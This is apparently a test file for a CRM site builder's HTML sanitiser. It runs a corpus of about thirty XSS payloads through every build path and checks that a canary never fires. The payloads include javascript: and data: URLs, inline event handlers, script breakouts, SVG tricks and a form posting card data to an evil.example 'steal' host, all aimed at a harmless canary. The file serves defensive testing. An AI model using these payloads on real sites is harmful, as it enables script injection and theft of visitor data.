// NexusCRM — SAFE OUTPUT CONTRACT (v0.0.0.0.19, Unit 1)
//
// Every byte of a published page goes through backend/src/nx_safe_html.js:
//   • AI-generated body markup is allow-list sanitised exactly like a user upload
//   • user-supplied `html` on POST/PATCH /sites keeps our own runtimes, drops all else
//   • plan URL fields are scheme-checked in normalizePlan (javascript:/data:text …)
//   • runtime literals (webhook URL, scene text, template __NX_CFG) cannot break out
//     of their <script> — JSON-LD is emitted through nxJsonForScript
//   • template blade slots are HTML-escaped (text slots, never markup)
//   • the public serve (/s/:slug AND /api/public/site/:slug) ships CSP + hardening
//
// Proof is EXECUTION, not grep: each hostile page is loaded in jsdom with
// runScripts:'dangerously' and a canary; the canary must never fire.
//
// Run: node tests/test_safe_html.mjs
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { createRequire } from 'node:module';

const __dirname = dirname(fileURLToPath(import.meta.url));
const require = createRequire(import.meta.url);
const S = require('../backend/src/nx_safe_html.js');
const { init, DB } = require('./d1mock.js');
const schema = readFileSync(join(__dirname, '..', 'backend', 'schema.sql'), 'utf8');
await init(schema);
const worker = (await import(join(__dirname, '..', 'backend', 'src', 'index.js'))).default;
const env = { DB, API_IP_RATE_MAX: 1e9, API_TOKEN_RATE_MAX: 1e9, ENCRYPTION_KEY: 'test-encryption-key-safe-html-0001' };
const ctx = { waitUntil: (p) => Promise.resolve(p).catch(() => { }) };
const BASE = 'http://test.local';

let jsdom = null;
try { jsdom = require('jsdom'); } catch { jsdom = null; }

let passed = 0, failed = 0; const failures = [];
function check(name, cond, extra = '') {
  if (cond) { passed++; console.log('  ✅ ' + name); }
  else { failed++; failures.push(name + (extra ? ' — ' + extra : '')); console.log('  ❌ ' + name + (extra ? ' — ' + extra : '')); }
}
async function call(method, path, body, token, rawHeaders) {
  const headers = Object.assign({ 'Content-Type': 'application/json', Origin: 'http://app.local' }, rawHeaders || {});
  if (token) headers.Authorization = 'Bearer ' + token;
  const req = new Request(BASE + '/api' + path, { method, headers, body: body ? JSON.stringify(body) : undefined });
  const res = await worker.fetch(req, env, ctx);
  let data = null; let text = '';
  const ct = res.headers.get('content-type') || '';
  if (/json/.test(ct)) { try { data = await res.json(); } catch { } } else { text = await res.text(); }
  return { status: res.status, data, text, headers: res.headers };
}

// ── Execute a page in jsdom with a canary; returns { fired, errors } ──────
function executePage(html) {
  if (!jsdom) return { fired: false, skipped: true };
  const { JSDOM, VirtualConsole } = jsdom;
  const vc = new VirtualConsole(); const errors = [];
  vc.on('jsdomError', (e) => errors.push(String(e && e.message || e)));
  let fired = false;
  const dom = new JSDOM(html, {
    runScripts: 'dangerously', pretendToBeVisual: true, virtualConsole: vc,
    beforeParse(window) {
      window.__nxCanary = () => { fired = true; };
      window.alert = () => { fired = true; };
      window.matchMedia = window.matchMedia || (() => ({ matches: false, addEventListener() { }, addListener() { } }));
      window.IntersectionObserver = window.IntersectionObserver || class { observe() { } unobserve() { } disconnect() { } };
      window.requestAnimationFrame = window.requestAnimationFrame || ((cb) => setTimeout(() => cb(Date.now()), 0));
      window.HTMLCanvasElement.prototype.getContext = () => null;
      window.fetch = () => Promise.resolve({ json: () => Promise.resolve({ ok: true }) });
    },
  });
  const doc = dom.window.document;
  // Fire handlers that jsdom does not fire on its own (no real resource loads).
  for (const el of doc.querySelectorAll('*')) {
    for (const a of Array.from(el.attributes)) {
      if (/^on/i.test(a.name)) { try { el.dispatchEvent(new dom.window.Event(a.name.slice(2), { bubbles: true })); } catch { } }
    }
  }
  // Any surviving javascript: link would run on click — treat its presence as a fire.
  for (const a of doc.querySelectorAll('[href],[src],[action],[formaction],[xlink\\:href]')) {
    for (const n of ['href', 'src', 'action', 'formaction', 'xlink:href']) {
      const v = a.getAttribute(n); if (v && /^\s*(javascript|vbscript|data:text\/html)/i.test(v.replace(/[\u0000-\u0020]/g, ''))) fired = true;
    }
  }
  const out = { fired, errors, window: dom.window, document: doc };
  return out;
}

// Static detector for vectors that survived as REAL markup (not as escaped text).
function staticVectors(html) {
  const bad = [];
  const tags = html.match(/<[a-z][^>]*>/gi) || [];
  // attribute NAMES only — an escaped "onerror=" inside a quoted value is inert text
  const attrNames = (t) => { const names = []; const re = /\s([^\s"'=<>\/]+)(\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'>]+))?/g; let m; const body = t.replace(/^<[a-z][a-z0-9-]*/i, ''); while ((m = re.exec(body))) names.push(m[1].toLowerCase()); return names; };
  if (tags.some((t) => attrNames(t).some((n) => /^on[a-z]+$/.test(n)))) bad.push('inline handler');
  if (tags.some((t) => /(href|src|action|formaction|url|data)\s*=\s*["']?\s*(javascript|vbscript|data:text\/html)/i.test(t.replace(/&#x?[0-9a-f]+;?/gi, '')))) bad.push('javascript: url');
  if (/<script>__nxCanary\(\)<\/script>/.test(html)) bad.push('script literal');
  if (tags.some((t) => /^<iframe\b/i.test(t) && /\bsrcdoc=/i.test(t))) bad.push('srcdoc');
  if (tags.some((t) => /^<(object|embed|base)\b/i.test(t))) bad.push('object/embed/base');
  if (tags.some((t) => /evil\.example/.test(t))) bad.push('foreign host in tag');
  // a canary inside any non-JSON script block means a runtime literal was broken out of
  for (const m of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)) {
    if (/ld\+json/.test(m[1])) continue;
    const body = m[2];
    if (/__nxCanary\(\)/.test(body) && !/\\u003cscript\\u003e__nxCanary/.test(body) && /(^|[^\\"'])__nxCanary\(\)/.test(body.replace(/"(?:[^"\\]|\\.)*"/g, '""').replace(/'(?:[^'\\]|\\.)*'/g, "''"))) bad.push('canary executable in script');
  }
  return bad;
}

// ── The audit's payload corpus (S8/A3/S3/S9/S10/S11/S12 + new SMIL/spline) ──
const CANARY = '__nxCanary()';
const PAYLOADS = {
  img_onerror: `<img src=x onerror=${CANARY}>`,
  img_onerror_quoted: `<img src="x" onerror="${CANARY}">`,
  svg_onload: `<svg onload="${CANARY}"><circle r="4"/></svg>`,
  a_javascript: `<a href="javascript:${CANARY}">book now</a>`,
  a_entity_smuggle: `<a href="java&#115;cript:${CANARY}">call</a>`,
  a_tab_smuggle: `<a href="java\tscript:${CANARY}">x</a>`,
  script_plain: `<script>${CANARY}</script>`,
  script_split: `<scr<script>ipt>${CANARY}</script>`,
  script_nested: `<script><script>${CANARY}</script></script>`,
  script_close_breakout: `</script><script>${CANARY}</script>`,
  iframe_srcdoc: `<iframe srcdoc="<script>parent.__nxCanary()</script>"></iframe>`,
  iframe_js: `<iframe src="javascript:${CANARY}"></iframe>`,
  object_data: `<object data="data:text/html,<script>parent.__nxCanary()</script>"></object>`,
  embed_src: `<embed src="data:text/html,<script>parent.__nxCanary()</script>">`,
  form_evil: `<form action="https://evil.example/steal"><input name="card"><button formaction="javascript:${CANARY}">go</button></form>`,
  meta_refresh: `<meta http-equiv="refresh" content="0;url=javascript:${CANARY}">`,
  base_hijack: `<base href="https://evil.example/">`,
  style_expr: `<div style="width:expression(${CANARY})">x</div>`,
  style_url_js: `<div style="background:url(javascript:${CANARY})">x</div>`,
  details_ontoggle: `<details open ontoggle="${CANARY}">x</details>`,
  input_onfocus: `<input autofocus onfocus="${CANARY}">`,
  body_onload: `<body onload="${CANARY}">`,
  svg_use_js: `<svg><use xlink:href="javascript:${CANARY}"/></svg>`,
  svg_set_onload: `<svg><set attributeName="onload" to="${CANARY}"/><circle r="1"/></svg>`,
  svg_animate_href: `<svg><a><animate attributeName="href" values="javascript:${CANARY}"/><text>x</text></a></svg>`,
  math_href: `<math><maction actiontype="statusline#javascript:${CANARY}">x</maction></math>`,
  template_tag: `<template><img src=x onerror="${CANARY}"></template>`,
  noscript_trick: `<noscript><p title="</noscript><img src=x onerror=${CANARY}>"></noscript>`,
  data_html_href: `<a href="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuX19ueENhbmFyeSgpPC9zY3JpcHQ+">x</a>`,
  unicode_ws_scheme: `<a href="\u200Bjavascript:${CANARY}">x</a>`,
  uppercase_handler: `<DIV ONCLICK="${CANARY}">x</DIV>`,
  spline_evil_host: `<spline-viewer url="https://evil.example/x.splinecode"></spline-viewer>`,
};
const ALL = Object.values(PAYLOADS).join('\n');

console.log('\n== UNIT: nxSanitizeFragment on every payload ==');
{
  let survivors = 0;
  for (const [k, v] of Object.entries(PAYLOADS)) {
    const out = S.nxSanitizeFragment(v);
    const bad = /\son[a-z]+\s*=/i.test(out) || /javascript:|vbscript:|data:text\/html/i.test(out.replace(/&#?\w+;?/g, '')) || /<\/?(script|object|embed|meta|base|iframe|template|math)\b/i.test(out) || /expression\s*\(/i.test(out) || /__nxCanary/.test(out) && /<script|on[a-z]+=/i.test(out);
    if (bad) { survivors++; console.log('     survivor', k, '→', JSON.stringify(out).slice(0, 120)); }
  }
  check('no payload survives the fragment sanitiser (' + Object.keys(PAYLOADS).length + ' vectors)', survivors === 0, survivors + ' survived');
  const legit = '<section class="nx-hero" id="home"><h1>Hi <span class="grad-text">there</span></h1><p class="lead">Sub &amp; more</p><a class="btn btn-primary" href="#contact" target="_blank">Go</a><img src="https://i.example/a.jpg" alt="A" loading="lazy" srcset="https://i.example/a@2x.jpg 2x"><a href="tel:+201000000000">Call</a><a href="mailto:a@b.c">Mail</a><a href="https://wa.me/2010">WA</a><iframe src="https://www.youtube.com/embed/abc" allowfullscreen></iframe><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M1 1"/><animate attributeName="r" values="3;5;3" dur="2s" repeatCount="indefinite"/></svg><form action="/api/lead" method="post"><input name="n" required></form><spline-viewer url="https://prod.spline.design/abc/scene.splinecode"></spline-viewer></section>';
  const out = S.nxSanitizeFragment(legit);
  check('legit markup: classes/ids/hrefs/alt/srcset preserved', out.includes('class="nx-hero"') && out.includes('id="home"') && out.includes('href="#contact"') && out.includes('alt="A"') && out.includes('srcset="https://i.example/a@2x.jpg 2x"'));
  check('legit markup: entities not double-encoded', out.includes('Sub &amp; more') && !out.includes('&amp;amp;'));
  check('legit markup: tel/mailto/wa/youtube/spline/svg-animate/form kept', /tel:/.test(out) && /mailto:/.test(out) && /wa\.me/.test(out) && /<iframe[^>]+youtube[^>]+sandbox=/.test(out) && /<spline-viewer url="https:\/\/prod\.spline\.design/.test(out) && /<animate attributeName="r"/.test(out) && /<form action="\/api\/lead"/.test(out));
  check('target=_blank gets rel=noopener', /rel="noopener noreferrer"/.test(out));
  check('svg camelCase (viewBox) preserved', /viewBox="0 0 24 24"/.test(out));
  check('nxJsonForScript neutralises </script> and U+2028', !/<\/script/.test(S.nxJsonForScript({ a: '</script><script>x', b: 'a\u2028b' })) && !/\u2028/.test(S.nxJsonForScript({ b: 'a\u2028b' })));
  check("nxJsString cannot close its literal", S.nxJsString("');__nxCanary();//") === JSON.stringify("');__nxCanary();//") && !/<\/script/.test(S.nxJsString('</script>')));
  check('nxSafeUrl: http/https/mailto/tel pass, javascript/data:text fail', S.nxSafeUrl('https://x.y/') && S.nxSafeUrl('mailto:a@b.c') && S.nxSafeUrl('tel:+1') && !S.nxSafeUrl('javascript:1') && !S.nxSafeUrl('data:text/html,x') && !S.nxSafeUrl(' JaVaScRiPt:1'));
  check('nxSafeUrl: data:image only when opted in; svg only with allowDataSvg', !S.nxSafeUrl('data:image/png;base64,AA') && !!S.nxSafeUrl('data:image/png;base64,AA', { allowDataImage: true }) && !S.nxSafeUrl('data:image/svg+xml,<svg/>', { allowDataImage: true }) && !!S.nxSafeUrl('data:image/svg+xml,%3Csvg%3E', { allowDataImage: true, allowDataSvg: true }));
  // fixpoint / pathological inputs
  const deep = '<div>'.repeat(20000) + 'x';
  const t0 = Date.now(); const dOut = S.nxSanitizeFragment(deep); const ms = Date.now() - t0;
  check('20k nested divs sanitised in < 2s without throwing', typeof dOut === 'string' && ms < 2000, ms + 'ms');
  const long = '<a href="' + 'a'.repeat(100000) + '">x</a>' + '<img src=x onerror=' + CANARY + '>';
  check('100KB attribute does not disable later checks', !/onerror/.test(S.nxSanitizeFragment(long)));
  check('unterminated tag is escaped, not emitted', !/<div/.test(S.nxSanitizeFragment('<div class="a')));
}

console.log('\n== AUTH ==');
let token;
{
  const r = await call('POST', '/auth/register', { name: 'P', email: 'safe@example.com', password: 'password123' });
  check('register returns token', r.status === 200 && !!r.data?.token, (r.data?.error || '').slice(0, 80));
  token = r.data.token;
}

// Hostile plan: every text/URL field carries a vector.
const HOSTILE_PLAN = {
  tagline: `Fast <img src=x onerror=${CANARY}> service`,
  meta_desc: `"><script>${CANARY}</script>`,
  hero_image: `javascript:${CANARY}`,
  about_image: `data:text/html,<script>parent.__nxCanary()</script>`,
  gallery_imgs: [`javascript:${CANARY}`, 'https://images.unsplash.com/photo-1?w=800', `data:image/svg+xml,<svg onload=parent.__nxCanary()>`],
  video_url: `javascript:${CANARY}`,
  map_url: `javascript:${CANARY}`,
  services: [{ title: `<svg onload=${CANARY}>Leak</svg>`, desc: `</script><script>${CANARY}</script>`, icon: '<img src=x onerror=' + CANARY + '>' }],
  reviews: [{ name: `</script><script>${CANARY}</script>`, text: `<a href="javascript:${CANARY}">x</a>`, stars: 5 }],
  faqs: [{ q: `<details open ontoggle=${CANARY}>q</details>`, a: `<iframe srcdoc="<script>parent.__nxCanary()</script>"></iframe>` }],
  team: [{ name: `<b onmouseover=${CANARY}>n</b>`, role: 'r', img: `javascript:${CANARY}` }],
  socials: [{ name: 'x', url: `javascript:${CANARY}` }],
  contact: { phone: `+20<script>${CANARY}</script>`, email: `a@b.c"><img src=x onerror=${CANARY}>`, address: `</script><script>${CANARY}</script>`, whatsapp: `javascript:${CANARY}` },
  working_hours: [`Sat<img src=x onerror=${CANARY}>`],
  process: [{ title: `<svg/onload=${CANARY}>`, desc: 'd' }],
  why: [{ title: `x</script><script>${CANARY}//`, desc: 'd' }],
};

console.log('\n== LIVE ROUTE: hostile plan through every builder entry point (execution proof) ==');
const designs = (await call('GET', '/ai/site-designs', null, token)).data?.designs?.map((d) => d.id) || ['sentinel', 'template'];
const variants = [];
for (const id of designs) variants.push({ label: 'design:' + id, body: { design_id: id } });
for (const d of ['editorial-minimal', 'cinematic-immersive', 'bold-experimental']) variants.push({ label: 'direction:' + d, body: { direction: d } });
variants.push({ label: 'scene+spline+webhook+sceneText', body: { design_id: 'sentinel', scene_id: 'tx1', three_d: 'subtle', scene_text: `');${CANARY};//`, spline_url: `javascript:${CANARY}`, webhook_url: `');${CANARY};//` } });
variants.push({ label: 'webhook </script> breakout', body: { design_id: 'sentinel', webhook_url: `</script><script>${CANARY}</script>` } });
const built = [];
for (const v of variants) {
  const r = await call('POST', '/sites', Object.assign({ name: `Nile <img src=x onerror=${CANARY}> Plumbing`, description: `Plumber </script><script>${CANARY}</script> in Banha`, build_with_ai: true, deterministic: true, published: true, plan: HOSTILE_PLAN }, v.body), token);
  const ok = r.status === 200 && typeof r.data?.html === 'string' && r.data.html.length > 2000;
  if (!ok) { check('build ' + v.label, false, r.status + ' ' + (r.data?.error || '').slice(0, 80)); continue; }
  built.push({ label: v.label, id: r.data.id, slug: r.data.slug, html: r.data.html });
  const html = r.data.html;
  const staticBad = staticVectors(html);
  const ex = executePage(html);
  check(v.label + ' — canary never fires (' + (ex.skipped ? 'static only' : 'jsdom executed') + ')', staticBad.length === 0 && !ex.fired, staticBad.join(',') + (ex.fired ? ' CANARY FIRED' : ''));
  if (!ex.skipped) {
    const dupBody = (html.match(/<body\b/gi) || []).length;
    check(v.label + ' — exactly one <body> and JSON-LD parses', dupBody === 1 && Array.from(ex.document.querySelectorAll('script[type="application/ld+json"]')).every((s) => { try { JSON.parse(s.textContent); return true; } catch { return false; } }), 'bodies=' + dupBody);
  }
}
check('at least ' + Math.min(variants.length, 10) + ' variants built', built.length >= Math.min(variants.length, 10), built.length + '/' + variants.length);

console.log('\n== LIVE ROUTE: AI-body sanitiser (model output = untrusted) ==');
{
  // A custom provider is simulated by stubbing fetch: the model returns the whole payload corpus as the body.
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    const u = String(url);
    if (/\/chat\/completions/.test(u)) {
      // A COMPLETE page (nav → hero → contact form → footer, real text) with
      // the whole payload corpus in the middle: the model-output verdict
      // (site/model_output.js) must accept it as a usable body so that the
      // sanitiser — not the fallback renderer — is what neutralises it.
      const page = '<nav class="nx-nav"><div class="container nx-nav-inner"><div class="nx-brand">Test</div><ul class="nx-nav-links"><li><a href="#contact">Contact</a></li></ul></div></nav>'
        + '<main><section class="nx-hero" id="home"><div class="container"><h1>Hi</h1><p>Fast, friendly plumbing for homes and businesses across the city, seven days a week.</p></div></section>'
        + '<section class="section" id="services"><div class="container"><h2>Services</h2>' + ALL + '</div></section>'
        + '<section class="section" id="contact"><div class="container"><h2>Contact</h2><form class="nx-form"><input name="name" placeholder="Name"><input name="email" type="email" placeholder="Email"><textarea name="message"></textarea><button type="submit" class="btn btn-primary">Send</button></form></div></section></main>'
        + '<footer class="nx-footer"><div class="container">© Test Plumbing</div></footer>';
      return new Response(JSON.stringify({ choices: [{ message: { content: page } }], usage: { total_tokens: 10 } }), { status: 200, headers: { 'Content-Type': 'application/json' } });
    }
    if (/\/models/.test(u)) return new Response(JSON.stringify({ data: [{ id: 'm1' }] }), { status: 200, headers: { 'Content-Type': 'application/json' } });
    return realFetch(url, init);
  };
  try {
    const s = await call('PATCH', '/ai/settings', { provider: 'custom', custom_base_url: 'https://llm.example/v1', custom_key: 'sk-test-12345678', model: 'm1' }, token);
    const r = await call('POST', '/sites', { name: 'AI Body', description: 'plumber', build_with_ai: true, deterministic: false, design_id: 'sentinel', published: true }, token);
    const html = r.data?.html || '';
    const usedModel = html.includes('<h1>Hi</h1>');
    const ex = executePage(html);
    check('AI body path reached the (stubbed) model', usedModel, s.status + ' ' + (r.data?.error || '').slice(0, 60) + ' len=' + html.length);
    const sv = staticVectors(html);
    check('AI body: no payload survives, canary never fires', sv.length === 0 && !ex.fired, sv.join(',') + (ex.fired ? ' CANARY FIRED' : ''));
  } finally { globalThis.fetch = realFetch; await call('PATCH', '/ai/settings', { provider: 'nvidia' }, token); }
}

console.log('\n== LIVE ROUTE: user html on POST / PATCH keeps our runtime, drops hostile script ==');
{
  const base = built.find((b) => b.label === 'design:sentinel') || built[0];
  const hostileDoc = base.html.replace('</body>', ALL + '<script>' + CANARY + '</script></body>');
  const r = await call('POST', '/sites', { name: 'Imported', html: hostileDoc, published: true }, token);
  const html = r.data?.html || '';
  const ex = executePage(html);
  check('POST /sites {html}: own runtime kept (form JS present)', /NX_LEAD_URL/.test(html));
  // every own runtime survives for every design (template runtime, scene/spline scripts, compose runtime)
  // The lead-URL literal is the ONE thing an import may legitimately rewrite:
  // a page whose explicit webhook was rejected at build time ships
  // disconnected (`var NX_LEAD_URL="";`), and re-importing it into the
  // workspace reconnects the form to the workspace's own inbox endpoint (N8).
  // Everything else in every own runtime must survive byte-for-byte.
  const ownScripts = (h) => (h.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi) || []).filter((x) => !/ld\+json/.test(x)).map((x) => x.replace(/var NX_LEAD_URL=(?:'[^']*'|"(?:[^"\\]|\\.)*");/, 'var NX_LEAD_URL=<lead>;'));
  let kept = 0, total = 0;
  for (const b of built) {
    const rr = await call('POST', '/sites', { name: 'Re-import ' + b.label, html: b.html }, token);
    const a = ownScripts(b.html), o = ownScripts(rr.data?.html || '');
    total++; if (a.length === o.length && a.every((x) => o.includes(x))) kept++; else console.log('     runtime lost on re-import:', b.label, a.length, '→', o.length);
  }
  check('re-importing every generated design keeps all of its own runtime scripts (' + kept + '/' + total + ')', kept === total);
  // the graph runtime (NXRuntime) is the one runtime that is not a template literal in the worker — cover it explicitly
  const g = await call('POST', '/sites', { name: 'Graph Co', description: 'Plumber', build_with_ai: true, deterministic: true, design_id: 'sentinel' }, token);
  const imp = await call('POST', '/sites/' + g.data.id + '/import', {}, token);
  const gh = (await call('GET', '/sites/' + g.data.id + '/html', null, token)).data?.html || '';
  const re = await call('POST', '/sites', { name: 'Graph re-import', html: gh }, token);
  check('graph-compiled page (NXRuntime) re-imports byte-identically', imp.data?.recompiled === true && /NXRuntime/.test(gh) && re.data?.html === gh, (re.data?.html || '').length + ' vs ' + gh.length);
  const sv1 = staticVectors(html);
  check('POST /sites {html}: hostile script + handlers removed, canary never fires', sv1.length === 0 && !ex.fired, sv1.join(',') + (ex.fired ? ' CANARY FIRED' : ''));
  const p = await call('PATCH', '/sites/' + base.id, { html: hostileDoc }, token);
  const h2 = (await call('GET', '/sites/' + base.id + '/html', null, token)).data?.html || '';
  const ex2 = executePage(h2);
  check('PATCH /sites/:id {html}: sanitised before persist', p.status === 200 && !/<script>__nxCanary/.test(h2) && !ex2.fired, p.status + (ex2.fired ? ' CANARY FIRED' : ''));
  const vis = await call('POST', '/sites/' + base.id + '/visual', { html: hostileDoc }, token);
  const h3 = (await call('GET', '/sites/' + base.id + '/html', null, token)).data?.html || '';
  check('POST /sites/:id/visual {html}: sanitised before persist', vis.status === 200 && !/<script>__nxCanary/.test(h3) && !executePage(h3).fired, String(vis.status));
}

console.log('\n== PUBLIC SERVE: CSP + hardening on BOTH routes, no auth, no AI ==');
{
  const site = built[0];
  const a = await worker.fetch(new Request(BASE + '/s/' + site.slug), env, ctx);
  const b = await worker.fetch(new Request(BASE + '/api/public/site/' + site.slug, { headers: { Origin: 'http://app.local' } }), env, ctx);
  for (const [label, res] of [['/s/:slug', a], ['/api/public/site/:slug', b]]) {
    const csp = res.headers.get('Content-Security-Policy') || '';
    check(label + ' 200 text/html', res.status === 200 && /text\/html/.test(res.headers.get('content-type') || ''));
    check(label + ' CSP present with object-src none / base-uri none / frame-src allowlist', /object-src 'none'/.test(csp) && /base-uri 'none'/.test(csp) && /frame-src https:\/\/www\.youtube\.com/.test(csp) && /script-src 'self' 'unsafe-inline'/.test(csp) && /https:\/\/unpkg\.com/.test(csp));
    check(label + ' hardening headers', res.headers.get('X-Content-Type-Options') === 'nosniff' && /strict-origin/.test(res.headers.get('Referrer-Policy') || '') && !!res.headers.get('Permissions-Policy'));
    check(label + ' no undefined header values', ![...res.headers.values()].some((v) => v === 'undefined' || v === 'null'));
  }
  check('/api/public/site grants the dashboard origin as frame-ancestor and drops X-Frame-Options', /frame-ancestors 'self' http:\/\/app\.local/.test(b.headers.get('Content-Security-Policy') || '') && !b.headers.get('X-Frame-Options'));
  check('/s/:slug keeps X-Frame-Options SAMEORIGIN', a.headers.get('X-Frame-Options') === 'SAMEORIGIN');
  const bodyA = await a.text();
  check('served html is the stored page (sanitised)', bodyA.length > 2000 && staticVectors(bodyA).length === 0, staticVectors(bodyA).join(','));
  // unpublished → 404, junk slug → 404, POST → JSON 405 (runtime can render the error)
  await call('PATCH', '/sites/' + site.id, { published: false }, token);
  const unpub = await worker.fetch(new Request(BASE + '/s/' + site.slug), env, ctx);
  check('unpublished site → 404 with no-store', unpub.status === 404 && /no-store/.test(unpub.headers.get('Cache-Control') || ''));
  await call('PATCH', '/sites/' + site.id, { published: true }, token);
  const junk = await worker.fetch(new Request(BASE + '/s/..%2F..%2Fetc'), env, ctx);
  check('traversal-ish slug → 404 (never 500)', junk.status === 404);
  const post = await worker.fetch(new Request(BASE + '/s/' + site.slug, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{"name":"x"}' }), env, ctx);
  let pj = null; try { pj = await post.json(); } catch { }
  check('POST /s/:slug → JSON 405 with actionable error (form runtime can display it)', post.status === 405 && pj && pj.ok === false && /connected/i.test(pj.error || ''));
  // serve does not depend on AI/provider health: break settings, still serves
  await call('PATCH', '/ai/settings', { provider: 'custom', custom_base_url: 'https://down.example/v1', custom_key: 'sk-broken-000000', model: 'x' }, token);
  const still = await worker.fetch(new Request(BASE + '/s/' + site.slug), env, ctx);
  check('public serve independent of AI/provider state (W5)', still.status === 200);
  await call('PATCH', '/ai/settings', { provider: 'nvidia' }, token);
}

console.log('\n== WEBHOOK / LEAD FORM CONTRACT ==');
{
  const r = await call('POST', '/sites', { name: 'Lead', description: 'x', build_with_ai: true, deterministic: true, design_id: 'sentinel', webhook_url: 'https://api.example/api/public/webhook/tok' }, token);
  const html = r.data?.html || '';
  check('webhook URL embedded as a JS string literal (not raw splice)', /var NX_LEAD_URL="https:\/\/api\.example\/api\/public\/webhook\/tok";/.test(html) && !/__WEBHOOK_URL__/.test(html));
  const r2 = await call('POST', '/sites', { name: 'Lead2', description: 'x', build_with_ai: true, deterministic: true, design_id: 'sentinel', webhook_url: 'ftp://x/y' }, token);
  check('non-http(s) webhook rejected → form explicitly disconnected (empty literal)', /var NX_LEAD_URL="";/.test(r2.data?.html || ''));
  const r3 = await call('POST', '/sites', { name: 'Lead3', description: 'x', build_with_ai: true, deterministic: true, design_id: 'sentinel', webhook_url: 'https://user:pw@api.example/hook' }, token);
  check('webhook with embedded credentials rejected', /var NX_LEAD_URL="";/.test(r3.data?.html || ''));
  check('disconnected form tells the visitor how to reach the business (no silent failure)', /not connected yet/.test(html));
}

console.log('\n== TEMPLATE DESIGN: slots are text, __NX_CFG cannot break out ==');
{
  const r = await call('POST', '/sites', { name: 'Tpl', description: 'x', build_with_ai: true, deterministic: true, design_id: 'template', published: true, plan: HOSTILE_PLAN }, token);
  const html = r.data?.html || '';
  const cfg = (html.match(/window\.__NX_CFG=([\s\S]*?);<\/script>/) || [])[1] || '';
  check('template built with hostile plan', r.status === 200 && html.length > 10000, String(r.status));
  check('__NX_CFG JSON has no raw < or > (breakout impossible) and parses', cfg && !/[<>]/.test(cfg) && (() => { try { JSON.parse(cfg); return true; } catch { return false; } })());
  check('blade slots escaped: no <svg onload / <img onerror in template body', !/<svg onload|<img src=x onerror/.test(html));
  check('template page executes without firing the canary', !executePage(html).fired);
}

console.log('\n==================================================');
console.log(`SAFE OUTPUT CONTRACT: ${passed} passed, ${failed} failed`);
if (failures.length) { console.log('\nFailures:'); failures.forEach((f) => console.log('  ✗ ' + f)); }
process.exit(failed ? 1 : 0);
